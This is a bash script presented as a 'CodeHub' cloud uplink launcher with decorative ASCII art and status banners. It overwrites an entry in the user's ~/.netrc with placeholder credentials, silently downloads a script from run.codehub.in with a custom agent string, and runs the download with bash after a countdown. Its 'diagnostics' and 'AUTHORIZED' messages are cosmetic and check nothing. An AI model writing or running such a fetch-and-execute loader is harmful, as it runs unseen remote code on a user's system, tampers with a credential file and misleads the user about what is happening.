#!/usr/bin/env bash
# ==========================================================
# CODEHUB CLOUD SYSTEM | BANE-ANMESH 3S UPLINK
# DATE: 2026-03-07 | UI-TYPE: SEMA-HYPER-VISUAL
# ==========================================================
set -euo pipefail

# --- SEMA-BANE THEME ---
R='\033[1;38;5;196m'  # Crimson
G='\033[1;38;5;82m'   # Emerald
Y='\033[1;38;5;220m'  # Gold
C='\033[1;38;5;51m'   # Cyan
W='\033[1;38;5;255m'  # Pure White
DG='\033[0;38;5;244m' # Steel Gray
PURPLE='\033[1;38;5;141m'
NC='\033[0m'          # Reset

# --- CONFIG ---
HOST="run.codehub.in"
URL="https://${HOST}"
NETRC="${HOME}/.netrc"
IP="65.0.86.121"
LOCL_IP="10.1.0.29"

# --- UI RENDERER ---
render_header() {
    clear
    echo -e "${G}"
    cat << "EOF"
██████╗ ██████╗ ██████╗ ███████╗██╗  ██╗██╗   ██╗██████╗ 
██╔════╝██╔═══██╗██╔══██╗██╔════╝██║  ██║██║   ██║██╔══██╗
██║     ██║   ██║██████╔╝█████╗  ███████║██║   ██║██████╔╝
██║     ██║   ██║██╔══██╗██╔══╝  ██╔══██║██║   ██║██╔══██╗
╚██████╗╚██████╔╝██║  ██║███████╗██║  ██║╚██████╔╝██████╔╝
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
EOF
    echo -e "${NC}"
    echo -e "${PURPLE}┌──────────────────────────────────────────────────────────┐${NC}"
    echo -e "${PURPLE}│${NC}  ${R}☢️  BANE-ANMESH 3S UPLINK${NC} ${DG}v14.0${NC}          ${DG}$(date +"%H:%M")${NC}  ${PURPLE}│${NC}"
    echo -e "${PURPLE}└──────────────────────────────────────────────────────────┘${NC}"
    echo -e "${DG}                   POWERED BY GOSTDTGAMER${NC}"
}

render_header

# --- NETWORK DIAGNOSTICS SIDEBAR ---
echo -e "  ${C}NETWORK ROUTE DIAGNOSTICS${NC}"
echo -e "  ${DG}├─ Public Endpoint :${NC} ${W}$IP${NC}"
echo -e "  ${DG}├─ Local Gateway   :${NC} ${W}$LOCL_IP${NC}"
echo -e "  ${DG}├─ Target Host     :${NC} ${W}$HOST${NC}"
echo -e "  ${DG}└─ Security Level  :${NC} ${G}SSH V-65S${NC}"
echo -e "${DG}────────────────────────────────────────────────────────────${NC}"

# --- AUTHENTICATION SEQUENCE ---
echo -e "\n  ${Y}[1/2] AUTHENTICATION SEQUENCE${NC}"
echo -ne "  ${DG}├─ Linking Credentials...${NC} "
touch "$NETRC" && chmod 600 "$NETRC"
sed -i "/$HOST/d" "$NETRC" 2>/dev/null || true
printf "machine %s login %s password %s\n" "$HOST" "$IP" "$LOCL_IP" >> "$NETRC"
sleep 0.8
echo -e "${G}SUCCESS${NC}"

# --- UPLINK CONNECTION ---
echo -e "\n  ${Y}[2/2] BANE UPLINK PROTOCOL${NC}"
echo -ne "  ${DG}├─ Establishing Connection...${NC} "
payload="$(mktemp)"
trap "rm -f $payload" EXIT

# Use silent curl with netrc
if curl -fsSL -A "Bane-1s-Agent" --netrc -o "$payload" "$URL"; then
    echo -e "${G}CONNECTED${NC}"
    echo -e "  ${DG}└─ Agent Status:${NC} ${G}AUTHORIZED${NC}"

    echo -e "\n${DG}────────────────────────────────────────────────────────────${NC}"
    echo -ne "  ${W}Triggering execution in ${R}3s${NC} "
    for i in {1..3}; do echo -ne "${R}.${NC}"; sleep 1; done
    echo -e "\n"

    # Execute payload
    bash "$payload"
else
    echo -e "${R}FAILED${NC}"
    echo -e "  ${DG}└─ Error Detail:${NC} ${R}Connection Terminated by Host${NC}"
    echo -e "\n  ${R}[!] CRITICAL:${NC} Authentication handshake failed."
    exit 1
fi
